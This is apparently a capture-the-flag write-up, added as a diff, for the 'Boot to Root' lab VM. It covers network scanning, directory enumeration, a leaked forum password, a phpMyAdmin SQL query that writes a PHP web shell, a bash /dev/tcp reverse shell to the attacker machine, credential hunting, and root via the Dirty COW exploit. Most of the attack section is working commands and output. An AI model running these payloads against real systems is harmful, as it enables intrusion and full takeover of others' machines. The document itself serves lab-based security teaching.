@@ -1,0 +1,244 @@
+# Boot to Root
+
+## Submission
+
+Create two virtual machines:
+
+- Boot 2 Root (target)
+- Parrot (attacker)
+
+Connect them through a Host-only Network
+
+On the virtual box interface —> network —> create
+
+Then for both virtual machines: Settings → Network → Adapter 1: Attached to: Host-only Network → Name: (the one we just created)
+
+Start both vms
+
+In parrot terminal
+
+`ip a`
+
+Then I can see my Inet address on that network.
+
+I will use `nmap -sn 192.168.56.0/24` to list other machines on my network
+
+Then I can use `nmap -Pn -n --disable-arp-ping 192.168.56.101` to discover what ports are open and what services are open.
+
+The result will look like this:
+
+```bash
+[user@parrot]─[~]
+└──╼ $nmap -Pn -n --disable-arp-ping 192.168.56.101
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-05 13:38 UTC
+Nmap scan report for 192.168.56.101
+Host is up (0.00015s latency).
+Not shown: 994 closed tcp ports (conn-refused)
+PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+80/tcp  open  http
+143/tcp open  imap
+443/tcp open  https
+993/tcp open  imaps
+```
+
+### Directory enumeration
+
+There is a program that can discover sub directories for a given URL call gobuster, we will use it to try common names:
+
+```bash
+$gobuster dir -u http://192.168.56.101/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
+```
+
+I did the same action but using https, I found `/phpmyadmin /webmail` and can access the forum. That uses my little forum.
+
+If the machine doesn't have gobuster we can do the same using ffuf that can be installed with:
+
+> pkcon install ffuf
+
+The wordlist can be downloaded from github (if your distro doesn't provide)
+
+> wget -q https://raw.githubusercontent.com/drtychai/wordlists/refs/heads/master/dirb/common.txt
+
+And to run:
+
+> ffuf -u https://192.168.56.101/FUZZ -w /usr/share/wordlists/dirb/common.txt
+
+This will return the several entries amongs them is `/forum`
+
+```
+cgi-bin/                [Status: 403, Size: 291, Words: 21, Lines: 11, Duration: 0ms]
+forum                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 0ms]
+phpmyadmin              [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 0ms]
+server-status           [Status: 403, Size: 296, Words: 21, Lines: 11, Duration: 0ms]
+webmail                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 0ms]
+```
+
+### Forum and webmail access
+
+When we read all the posts we could found one that have a log of a terminal and we can see that by accident the user expose his password.
+
+[Post that exposes the password](https://192.168.56.101/forum/index.php?id=6)
+
+> **Password:** `********` — author of the post and username in the session details: `lmezard`
+
+In the forum platform there is a option to send emails to another user. When I tried to use this I found lmezard email: `laurie@borntosec.net` and we can also see it in [user's profile](https://192.168.56.101/forum/index.php?mode=user&action=edit_profile)
+
+I access the [webmail](https://192.168.56.101/webmail/src/login.php) using the email and password and worked.
+
+### phpMyAdmin → RCE via shell.php
+
+I found database credentials in one of the emails: `root` and `********`
+
+Once we connect to the database using [php my admin](https://192.168.56.101/phpmyadmin/) we can do this sql query to obtain a shell.
+
+```
+SELECT "<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; ?>"
+INTO OUTFILE '/var/www/forum/templates_c/shell.php';
+```
+
+Then on the browser
+
+we can discover different users
+
+> https://192.168.56.101/forum/templates_c/shell.php?cmd=cat%20/etc/passwd
+
+and because it's a fully working shell we can initiate a reverse shell session
+
+on attaker machine we open a listening socket with nc
+
+> nc -lvnp 4444
+
+this will allow us to listen when the born to root server will connect to us and we will have a shell.
+
+then run via PHP exploit
+
+> bash -c 'bash -i >& /dev/tcp/<PARROT_IP>/4444 0>&1'
+
+The callback address must be the Parrot VM address. We can send the
+URL-encoded command with:
+
+```sh
+curl -ksS -G \
+  --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/<PARROT_IP>/4444 0>&1"' \
+  'https://192.168.56.101/forum/templates_c/shell.php'
+```
+
+Unfortunately it doesn't work on the school computer
+
+### Lateral movement: lmezard → FTP
+
+[Running find command](https://192.168.56.101/forum/templates_c/shell.php?cmd=bash%20-c%20%22find%20/%20-iname%20%27*password*%27%202%3E/dev/null%22)
+
+`$ find / -iname '*password*' 2>/dev/null` will show an interesting file: …/LOOKATME/password
+
+[There are some credentials](https://192.168.56.101/forum/templates_c/shell.php?cmd=sh%20-c%20%22cat%20/home/LOOKATME/password%22)
+
+This is the user that I already have but with a different password. so I tried in the other service `FTP`
+
+> pkcon install ftp
+> pkcon install lftp
+
+I can connect to `lftp lmezard@192.168.56.101` using the password that we found: `********`
+
+```
+user@parrot:~$ lftp lmezard@192.168.56.101
+Password:
+lftp lmezard@192.168.56.101:~> ls
+-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
+-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
+```
+
+We use `get` command to download this two files to our machine.
+
+The readme file say that if we complete the challenge we have the password for laurie's ssh
+
+fun is a posix tar file (gnu)
+
+to unzip we have to do `tar xvf fun`
+
+Then we can use this bash to extract the password:
+
+```bash
+for f in *.pcap; do
+  n=$(grep -aoP '//file\K\d+' "$f")
+  [ -n "$n" ] && printf '%s\t%s\n' "$n" "$f"
+done | sort -n | cut -f2 | while read f; do
+  cat "$f"; echo    # the echo ensures the trailing \n missing at the end of each file
+done > raw.c
+
+perl -0777 -pe 's{/\*.*?\*/}{}gs; s{//[^\n]*}{}g' raw.c > result.c
+
+gcc -w result.c -o result && ./result
+```
+
+The output is:
+
+```text
+MY PASSWORD IS: ********
+Now SHA-256 it and submit
+```
+
+So we can sha-256:
+
+```bash
+$ read -r -s -p 'Phrase printed by fun: ' RECOVERED_PHRASE
+$ printf '%s' "$RECOVERED_PHRASE" | sha256sum
+********
+```
+
+### Using dirty.c
+
+The earlier `fun` result supplies Laurie's SSH password. Copy the reviewed
+[dirty.c](./scripts/dirty.c) source from Parrot to Laurie's home directory,
+then log in. The repository contains source only; compile it on the target.
+
+```sh
+scp scripts/dirty.c laurie@192.168.56.101:/home/laurie/dirty.c
+ssh laurie@192.168.56.101
+```
+
+Run without a password argument. The program prompts without echoing the
+chosen temporary password, backs up `/etc/passwd`, and attempts the
+Dirty COW write:
+
+```bash
+laurie@BornToSecHackMe:~$ gcc -pthread dirty.c -o dirty -lcrypt
+laurie@BornToSecHackMe:~$ ./dirty
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password:
+
+mmap: b7fda000
+madvise 0
+
+ptrace 0
+Done! Check /etc/passwd to see if the new user was created.
+You can log in with the username 'toor' and the password you entered.
+
+
+RESTORE /etc/passwd from /tmp/passwd.bak after proving UID 0.
+```
+
+The password was entered at the prompt and is not recorded in this
+repository. Switch to the temporary UID-0 user, prove the identity in a
+real shell, and restore the original password file before ending the test:
+
+```sh
+su - toor
+id -u
+whoami
+id -ru
+cp /tmp/passwd.bak /etc/passwd
+chown root:root /etc/passwd
+chmod 644 /etc/passwd
+if cmp -s /tmp/passwd.bak /etc/passwd; then echo 'Original contents restored'; rm /tmp/passwd.bak; else echo 'Restore mismatch; keep backup'; fi
+stat -c '%U:%G %a' /etc/passwd
+grep '^toor:' /etc/passwd || echo 'Temporary account removed'
+```
+
+The first three checks must show UID 0 and `root` before the route counts as
+mandatory. The current transcript does not contain their observed output,
+so it still needs a live defense-VM verification. Copying into the existing
+`/etc/passwd` inode and resetting ownership and mode avoids replacing it
+with the Laurie-owned backup. No persistent `sudoers` change is needed.
